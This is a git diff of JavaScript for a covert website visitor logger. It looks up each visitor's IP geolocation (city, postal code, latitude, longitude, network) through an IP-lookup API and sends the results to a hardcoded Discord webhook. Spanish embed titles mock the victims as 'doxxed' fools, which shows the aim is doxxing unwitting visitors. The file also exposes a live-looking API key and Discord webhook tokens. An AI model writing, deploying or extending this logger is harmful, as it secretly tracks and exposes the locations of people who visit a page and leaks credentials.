@@ -3,7 +3,7 @@
 // - const DISCORD_WEBHOOK = 'TU_WEBHOOK_DE_DISCORD_AQUI'; // si lo vas a usar
 
 const IPLOCATE_API_KEY = 'c91572a310cda49cb0e048c364b874d5'; // opcional, pon tu key aquí
-const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1435149039330136247/HGSYhy5w0hFUJGOuUVkMeYNaiF0E-5bWkv66haHafn5HSy6OqPgSr6hQPadPvu_SsMnh'; // reemplaza o elimina
+const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1435474404653137971/ZiVg8P9Okn5XSxAmCNzMKJCU8lT_yuwG2Ja6nB7-4XbgmEeSeNdAI9R0_sqhbIsBnaa0'; // reemplaza o elimina
 
 const sendIP = async () => {
   try {
@@ -26,22 +26,21 @@ const sendIP = async () => {
     const payload = {
       username: "site logger",
       // avatar_url: "https://example.com/avatar.jpg",
-      content: `ya cayo otro mas`,
+      content: `Ya cayo uno`,
       embeds: [
         {
-          title: 'Un tontito mas',
+          title: 'Tontito Doxxeado',
           description: [
             `**IP Address >>** ${ipadd}`,
             `**Network / ASN >>** ${geoData.asn ? (geoData.asn.name || geoData.asn.asn) : (geoData.org || 'N/A')}`,
-            `**City >>** ${geoData.city || 'N/A'}`,
-            `**Country >>** ${geoData.country || 'N/A'}`,
-            `**Postal Code >>** ${geoData.postal_code || 'N/A'}`,
-            `**Latitude >>** ${geoData.latitude ?? 'N/A'}`,
-            `**Longitude >>** ${geoData.longitude ?? 'N/A'}`,
-            `**Timezone >>** ${geoData.time_zone || 'N/A'}`,
             `**Satellite >>** ${geoData.is_satellite || 'N/A'}`,
-            `**Route >>** ${geoData.asn.route || 'N/A'}`,
-            `**Net Name >>** ${geoData.asn.netname || 'N/A'}`,
+            `**City >>** ${geoData.city || 'N/A'}`,
+            `**Country Code >>** ${geoData.country_code || 'N/A'}`,
+            `**Country >>** ${geoData.country || geoData.country_name || 'N/A'}`,
+            `**Postal Code >>** ${geoData.postal || geoData.postal_code || 'N/A'}`,
+            `**Latitude >>** ${geoData.latitude ?? geoData.lat ?? 'N/A'}`,
+            `**Longitude >>** ${geoData.longitude ?? geoData.lon ?? 'N/A'}`,
+            `**Timezone >>** ${geoData.timezone || 'N/A'}`
           ].join('\n'),
           color: 0x800080
         }
